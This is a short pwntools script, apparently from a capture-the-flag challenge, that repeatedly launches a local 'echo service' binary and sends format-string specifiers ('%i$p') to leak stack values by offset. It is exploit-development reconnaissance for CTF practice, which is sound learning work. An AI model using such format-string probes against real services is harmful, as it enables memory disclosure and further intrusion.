from pwn import *
elf = context.binary = ELF("./chall_patched")

for i in range(100):
    p = process()
    p.sendline(f"%{i}$p")
    p.recvuntil(b"Welcome to echo service!\n")
    print(f"{i} == {p.recvline().strip().decode()}")
    p.close()